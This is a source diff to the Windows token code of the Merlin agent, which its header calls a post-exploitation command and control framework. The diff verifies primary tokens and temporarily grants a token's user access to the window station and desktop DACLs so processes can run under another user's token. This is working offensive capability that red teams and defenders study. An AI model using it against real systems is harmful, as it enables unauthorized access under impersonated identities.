@@ -1,3 +1,4 @@
+//go:build windows
 // +build windows
 
 // Merlin is a post-exploitation command and control framework.
@@ -35,6 +36,7 @@ import (
 	// Internal
 	"github.com/Ne0nd0g/merlin-agent/cli"
 	"github.com/Ne0nd0g/merlin-agent/os/windows/api/advapi32"
+	"github.com/Ne0nd0g/merlin-agent/os/windows/api/user32"
 	"github.com/Ne0nd0g/merlin-agent/os/windows/pkg/pipes"
 )
 
@@ -117,7 +119,16 @@ func CreateProcessWithToken(hToken windows.Token, application string, args []str
 		return
 	}
 
-	// TODO verify the provided token is a PRIMARY token
+	// Get Process Token TOKEN_STATISTICS structure
+	statProc, err := GetTokenStats(hToken)
+	if err != nil {
+		stderr = err.Error()
+		return
+	}
+	if statProc.TokenType != windows.TokenPrimary {
+		stderr = "A PRIMARY Windows access token was not provided to tokens.CreateProcessWithToken()"
+		return
+	}
 	// TODO verify the provided token has the TOKEN_QUERY, TOKEN_DUPLICATE, and TOKEN_ASSIGN_PRIMARY access rights
 
 	// Search PATH environment variable to retrieve the application's absolute path
@@ -146,6 +157,146 @@ func CreateProcessWithToken(hToken windows.Token, application string, args []str
 	if err != nil {
 		stderr = err.Error()
 		return
+	}
+
+	sessionToken, err := GetTokenSessionId(hToken)
+	if err != nil {
+		stderr = err.Error()
+		return
+	}
+	var sessionCurrent uint32
+	err = windows.ProcessIdToSessionId(windows.GetCurrentProcessId(), &sessionCurrent)
+	if err != nil {
+		stderr = err.Error()
+		return
+	}
+
+	// If the calling process (the Merlin agent) and the token are in different window sessions we must allow the token
+	// user to access the calling session if we are not going to spawn the process in the token's session
+	// Never figured out if setting the lpDesktop for the STARTUPINFO structure would work
+	if sessionCurrent != sessionToken {
+		// Retrieve the passed in token's user information structure to leverage the SID later
+		user, err := hToken.GetTokenUser()
+		if err != nil {
+			stderr = fmt.Sprintf("there was an error calling GetTokenUser: %s\n", err)
+			return
+		}
+
+		// Create the trustee to add to an ACE
+		trustee := windows.TRUSTEE{
+			MultipleTrustee:          nil,
+			MultipleTrusteeOperation: windows.NO_MULTIPLE_TRUSTEE,
+			TrusteeForm:              windows.TRUSTEE_IS_SID,
+			TrusteeType:              windows.TRUSTEE_IS_USER,
+			TrusteeValue:             windows.TrusteeValueFromSID(user.User.Sid),
+		}
+
+		// Create the ACE
+		// WINSTA_ALL_ACCESS := 0x37F   		// WINSTA_ALL_ACCESS (0x37F)	All possible access rights for the window station.
+		// WINSTA_READATTRIBUTES := 0x0002 // (0x0002L) Required to read the attributes of a window station object. This attribute includes color settings and other global window station properties.
+		// WINSTA_WRITEATTRIBUTES := 0x0010 // (0x0010L) Required to modify the attributes of a window station object. The attributes include color settings and other global window station properties.
+		// WINSTA_ENUMDESKTOPS := 0x0001 // (0x0001L) Required to enumerate existing desktop objects.
+		// WINSTA_ENUMERATE := 0x0100 // (0x0100L)	Required for the window station to be enumerated.
+		// WINSTA_ACCESSCLIPBOARD := 0x0004   // (0x0004L) Required to use the clipboard.
+		WINSTA_ACCESSGLOBALATOMS := 0x0020 // (0x0020L)	Required to manipulate global atoms. REQUIRED
+		// WINSTA_CREATEDESKTOP := 0x0008     // (0x0008L)	Required to create new desktop objects on the window station.
+		WINSTA_EXITWINDOWS := 0x0040 // (0x0040L)	Required to successfully call the ExitWindows or ExitWindowsEx function. Window stations can be shared by users and this access type can prevent other users of a window station from logging off the window station owner. REQUIRED
+		// WINSTA_READSCREEN := 0x0200  // (0x0200L)	Required to access screen contents.
+		ace := windows.EXPLICIT_ACCESS{
+			AccessPermissions: windows.ACCESS_MASK(WINSTA_ACCESSGLOBALATOMS | WINSTA_EXITWINDOWS | windows.READ_CONTROL), // WINSTA_CREATEDESKTOP | WINSTA_READSCREEN | WINSTA_ACCESSCLIPBOARD | WINSTA_WRITEATTRIBUTES | WINSTA_ENUMDESKTOPS | WINSTA_ENUMERATE | WINSTA_READATTRIBUTES |
+			AccessMode:        windows.SET_ACCESS,
+			Inheritance:       windows.NO_INHERITANCE,
+			Trustee:           trustee,
+		}
+
+		si := windows.SECURITY_INFORMATION(windows.DACL_SECURITY_INFORMATION | windows.OWNER_SECURITY_INFORMATION | windows.ATTRIBUTE_SECURITY_INFORMATION | windows.GROUP_SECURITY_INFORMATION | windows.PROTECTED_DACL_SECURITY_INFORMATION | windows.UNPROTECTED_DACL_SECURITY_INFORMATION)
+
+		// Get a handle to the window station
+		hWinsta, err := user32.GetProcessWindowStation()
+		if err != nil {
+			stderr = err.Error()
+			return
+		}
+
+		// Retrieve security information (namely the DACL) for the window station
+		sdStation, err := windows.GetSecurityInfo(windows.Handle(hWinsta), windows.SE_KERNEL_OBJECT, si)
+		if err != nil {
+			stderr = fmt.Sprintf("there was an error calling windows.GetSecurityInfo with the window station handle: %s", err)
+			return
+		}
+		//stdout += fmt.Sprintf("Window Station SDDL: %s\n", sdStation)
+
+		// Add the new ACE for the token user to the existing security descriptor for the window station
+		sdStationNew, err := windows.BuildSecurityDescriptor(nil, nil, []windows.EXPLICIT_ACCESS{ace}, nil, sdStation)
+		if err != nil {
+			stderr = fmt.Sprintf("there was an error calling windows.BuildSecurityDescriptor for the station: %s\n", err)
+			return
+		}
+		//stdout += fmt.Sprintf("New window station security descriptor: %+v\n", sdStationNew)
+
+		// Update the window station security descriptor with the new DACL that contains access rights for the token user
+		err = windows.SetKernelObjectSecurity(windows.Handle(hWinsta), windows.DACL_SECURITY_INFORMATION, sdStationNew)
+		if err != nil {
+			stderr = fmt.Sprintf("there was an error calling windows.SetKernelObjectSecurity: %s\n", err)
+			return
+		}
+
+		// Defer restoring the original security descriptor for the window station
+		defer func() {
+			err = windows.SetKernelObjectSecurity(windows.Handle(hWinsta), windows.DACL_SECURITY_INFORMATION, sdStation)
+			if err != nil {
+				stderr += fmt.Sprintf("\nthere was an error calling windows.SetKernelObjectSecurity to restore the "+
+					"original security descriptor for the window station: %s\n", err)
+			}
+		}()
+
+		// Get a handle to the desktop securable object
+		hDesktop, err := user32.GetThreadDesktop(windows.GetCurrentThreadId())
+		if err != nil {
+			stderr = err.Error()
+			return
+		}
+
+		// Get the security information (namely the DACL) for the desktop object
+		sdDesktop, err := windows.GetSecurityInfo(windows.Handle(hDesktop), windows.SE_KERNEL_OBJECT, si)
+		if err != nil {
+			stderr = fmt.Sprintf("there was an error calling windows.GetSecurityInfo with the desktop object handle: %s", err)
+			return
+		}
+		//stdout += fmt.Sprintf("Window Desktop SDDL: %s\n", sdDesktop)
+
+		// Update the ACE with the required permissions for the desktop object windows.GENERIC_ALL
+		DESKTOP_WRITEOBJECTS := 0x0080 // (0x0080L)	Required to write objects on the desktop.
+		DESKTOP_READOBJECTS := 0x0001  // (0x0001L)	Required to read objects on the desktop.
+		// DESKTOP_CREATEMENU := 0x0004   // (0x0004L)	Required to create a menu on the desktop.
+		DESKTOP_CREATEWINDOW := 0x0002 // (0x0002L)	Required to create a window on the desktop. REQUIRED
+		// DESKTOP_ENUMERATE := 0x0040    // (0x0040L)	Required for the desktop to be enumerated.
+		//ace.AccessPermissions = windows.ACCESS_MASK(DESKTOP_CREATEWINDOW) // DESKTOP_ENUMERATE | DESKTOP_CREATEMENU | DESKTOP_READOBJECTS | DESKTOP_WRITEOBJECTS | WORKS WHEN TOKEN BELONGS TO ADMIN OR PRIMARY USER OF DESKTOP UNSURE WHICH
+		//ace.AccessPermissions = windows.ACCESS_MASK(windows.GENERIC_ALL) // WORKS
+		ace.AccessPermissions = windows.ACCESS_MASK(DESKTOP_CREATEWINDOW | DESKTOP_READOBJECTS | DESKTOP_WRITEOBJECTS) // DESKTOP_ENUMERATE | DESKTOP_CREATEMENU
+
+		// Add the new ACE for the token user to the existing security descriptor for the desktop object
+		sdDesktopNew, err := windows.BuildSecurityDescriptor(nil, nil, []windows.EXPLICIT_ACCESS{ace}, nil, sdDesktop)
+		if err != nil {
+			stderr = fmt.Sprintf("there was an error calling windows.BuildSecurityDescriptor for the new desktop security descriptor: %s\n", err)
+			return
+		}
+		//stdout += fmt.Sprintf("New Security Descriptor (desktop): %+v\n", sdDesktopNew)
+
+		// Update the desktop security descriptor with the new DACL that contains access rights for the token user
+		err = windows.SetKernelObjectSecurity(windows.Handle(hDesktop), windows.DACL_SECURITY_INFORMATION, sdDesktopNew)
+		if err != nil {
+			stderr = fmt.Sprintf("there was an error calling windows.SetKernelObjectSecurity to add an updated DACL to the desktop object: %s\n", err)
+			return
+		}
+
+		// Defer restoring the original security descriptor for the desktop
+		defer func() {
+			err = windows.SetKernelObjectSecurity(windows.Handle(hDesktop), windows.DACL_SECURITY_INFORMATION, sdDesktop)
+			if err != nil {
+				stderr += fmt.Sprintf("there was an error calling windows.SetKernelObjectSecurity to restore the original desktop security descriptor: %s\n", err)
+			}
+		}()
 	}
 
 	var lpCurrentDirectory uint16 = 0
@@ -350,6 +501,35 @@ func GetTokenUsername(token windows.Token) (username string, err error) {
 	}
 
 	username = fmt.Sprintf("%s\\%s", domain, account)
+	return
+}
+
+// GetTokenSessionId returns the session ID associated with the token
+func GetTokenSessionId(token windows.Token) (sessionId uint32, err error) {
+	cli.Message(cli.DEBUG, "entering tokens.GetTokenSessionId()")
+
+	// Determine the size needed for the structure
+	var returnLength uint32
+	err = windows.GetTokenInformation(token, windows.TokenSessionId, nil, 0, &returnLength)
+	if err != nil && err != syscall.ERROR_INSUFFICIENT_BUFFER {
+		err = fmt.Errorf("there was an error calling windows.GetTokenInformation: %s", err)
+		return
+	}
+
+	// Make the call with the known size of the object
+	info := bytes.NewBuffer(make([]byte, returnLength))
+	var returnLength2 uint32
+	err = windows.GetTokenInformation(token, windows.TokenSessionId, &info.Bytes()[0], returnLength, &returnLength2)
+	if err != nil {
+		err = fmt.Errorf("there was an error calling windows.GetTokenInformation: %s", err)
+		return
+	}
+
+	err = binary.Read(info, binary.LittleEndian, &sessionId)
+	if err != nil {
+		err = fmt.Errorf("there was an error reading binary into the TokenSessionId DWORD: %s", err)
+		return
+	}
 	return
 }
 
